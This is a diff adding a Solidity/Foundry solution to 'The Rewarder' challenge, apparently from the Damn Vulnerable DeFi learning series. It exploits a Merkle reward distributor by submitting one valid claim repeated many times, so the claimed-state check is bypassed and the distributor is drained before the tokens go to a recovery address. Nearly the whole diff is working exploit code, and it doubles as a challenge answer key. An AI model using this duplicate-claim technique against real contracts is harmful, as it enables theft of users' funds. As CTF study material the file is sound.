@@ -147,13 +147,86 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    // attack flow:
+    // 1. construct a array [claim1, claim1, claim1, claim1, ..... , claim2]
+    // 2. claim1 can bypass the first if condition `_setClaimed()` function.
+    // 3. duplicated claim1 can bypass the merkle proof verification duplicately
+    // 4. claim2 is a valid claim to bypass the last if condition `_setClaimed()` function.
+
+    // player index is 188
+    // address: 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11_524_763_827_831_882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim memory claim1 = Claim({
+            batchNumber: 0,
+            amount: PLAYER_DVT_CLAIM_AMOUNT,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+        });
+
+        Claim memory claim2 = Claim({
+            batchNumber: 0,
+            amount: PLAYER_WETH_CLAIM_AMOUNT,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+        });
+
+        // create a repeated claim1 array
+        uint256 arrayDVTLength = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / PLAYER_DVT_CLAIM_AMOUNT;
+        uint256 arrayWETHLength = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / PLAYER_WETH_CLAIM_AMOUNT;
+        Claim[] memory repeatedClaims = new Claim[](arrayDVTLength + arrayWETHLength);
+        for (uint256 i = 0; i < arrayDVTLength; i++) {
+            repeatedClaims[i] = claim1;
+        }
+
+        for(uint256 i = arrayDVTLength; i < arrayDVTLength + arrayWETHLength; i++) {
+            repeatedClaims[i] = claim2;
+        }
+
+        distributor.claimRewards({inputClaims: repeatedClaims, inputTokens: tokensToClaim});
+
+        // transfer all the tokens to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
+    function mergeClaims(Claim[] memory array1, Claim[] memory array2) internal pure returns (Claim[] memory result) {
+        uint256 len1 = array1.length;
+        uint256 len2 = array2.length;
+        result = new Claim[](len1 + len2);
+
+        for (uint256 i = 0; i < len1;) {
+            result[i] = array1[i];
+            unchecked {
+                ++i;
+            }
+        }
+
+        for (uint256 i = 0; i < len2;) {
+            result[len1 + i] = array2[i];
+            unchecked {
+                ++i;
+            }
+        }
+    }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
+
     function _isSolved() private view {
         // Player saved as much funds as possible, perhaps leaving some dust
         assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
